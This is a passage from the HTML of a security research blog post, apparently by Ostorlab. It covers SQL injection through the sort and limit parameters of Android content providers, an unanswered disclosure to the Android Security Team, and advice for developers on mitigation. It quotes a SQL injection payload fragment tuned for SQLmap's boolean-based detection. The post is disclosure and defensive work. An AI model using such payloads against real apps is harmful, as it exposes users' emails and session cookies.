+<code>_id/**/limit/**/(SELECT/**/1/**/FROM/**/sqlite_master/**/WHERE/**/1=</code> was the simplest way to get SQLmap to identify 
+it as a boolean-based injection instead of a heavy time-based injection.</p>
+<p>Dumping the weather forecast from database is of course not that critical, but out of the several apps  we've 
+identified, some allow to retrieve critical information like emails or session cookies.</p>
+<p>How does other APIs behave ?</p>
+<p>Django ORM prevents this and results in the following exception:</p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/django_model.jpg" title="django_model"/></p>
+<p>Java JDBC don't have a similar API allowing to set Order By, Limit or Group By parameters:</p>
+<p><a href="https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html#overview_ps">https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html#overview_ps</a></p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/jdbc.jpg" title="jdbc"/></p>
+<p>SQLAlchemy doesn't prevent against this either:</p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/sqlalchemy_1.jpg" title="jdbc"/></p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/sqlalchemy_2.jpg" title="jdbc"/></p>
+<p>We'll update the blog with how other APIs are behaving.  </p>
+<h2>III. Trying to report this</h2>
+<p>Before writing this article, we did report this issue to Android Security team, this is the response we've had:</p>
+<blockquote class="blockquote">
+<p>Hello,
+Thanks for the report. I filed a bug for the Android engineering team to look into this. The bug ID is specified by the 
+AndroidID label.
+We have not classified the severity of this report yet.  We ask that you keep this report confidential to give us time 
+to develop a fix and notify our bulletins of the vulnerability. We'll let you know if we have any questions.
+Please ensure that you have signed the Android contributor license agreement 
+(https://cla.developers.google.com/clas/new?kind=KIND_INDIVIDUAL&amp;domain=DOMAIN_ANDROID) so that we can use your contribution.
+Thanks again!
+The Android Security Team</p>
+</blockquote>
+<p>and then:</p>
+<blockquote class="blockquote">
+<p>Thank you for reporting this.
+The engineering team reviewed this and have determined this is not a security issue.
+The attack and data you can retrieve is already readily available to the attacker, so the SQL injection won't result 
+in any more information than the user already has access to.</p>
+</blockquote>
+<p>We did send a request for clarification as we've seen apps sharing access to a particular table and storing sensitive 
+data in the same database:  </p>
+<blockquote class="blockquote">
+<p>Ok thanks for your response.
+Please indulge my curiosity, but I'd just like to make sure I'm understanding correctly; if I have the following 
+example, an email App exporting a content provider to access a 'suggestion' table. If I'm able to use the fact that
+ I can inject SQL queries in the sort parameter and retrieve content from the 'emails' table which shouldn't be 
+ accessible, how would that be considered readily accessible to the attacker ? </p>
+</blockquote>
+<p>We unfortunately never heard back from them.</p>
+<p>Having exchanged with developers and other security researchers and digging through documentation and blogs, most 
+seem to assume that the API is SQLi safe.</p>
+<p>Our opinion is that we must educate developers on the risk of the API in the documentation section and the shared code 
+samples or have a more secure API.</p>
+<p>The impact exploiting this are mostly exposure of private information to malicious app already present on the phone, 
+which of course limits the risk, SQLite is known to be robustly tested and suffered from very few vulnerabilities in 
+the past (see https://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html), the presence of one could 
+mean code execution in the context of the vulnerable application.</p>
+<p>For Mobile App developers, to ensure that your application is not vulnerable:  </p>
+<ul>
+<li>Check the use of SQLite API accepting user input (either from content provider, broadcast receivers, services, 
+activities ...) that handles 'limit', 'group by', 'having' and 'sort' parameters</li>
+<li>Limit access to content providers with proper permissions (privilege Signature and SystemOrSignature type of 
+permissions) and explicity set the exported attribute</li>
+<li>Separate private data and less private data in separate database limits the impact of any potential SQL injection</li>
+<li>Check out SnappyDB <a href="https://github.com/nhachicha/SnappyDB">https://github.com/nhachicha/SnappyDB</a> used by apps like Uber</li>
+</ul>
+    </div>
+  </article>
+        </div>
+    </div>
+</div>
+
+<footer class="footer">
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+    <div class="container">
+<div class="row">
+  <ul class="col-sm-6 list-inline">
+    <li class="list-inline-item"><a href="/categories.html">Categories</a></li>
+      <li class="list-inline-item"><a href="/tags.html">Tags</a></li>
+    <li class="list-inline-item"><a href="https://ostorlab.co/" target="_blank">Scanner</a></li>
+    <li class="list-inline-item"><a href="https://ostorlab.co/about" target="_blank">About</a></li>
+  </ul>
+
+  <p class="col-sm-6 text-sm-right text-muted">
+    <i class="fa fa-envelope pr-10"></i> contact<strong>@ostorlab.co</strong>
+  </p>
+
+</div>    </div>
+</footer>
+</body>
+
+</html>
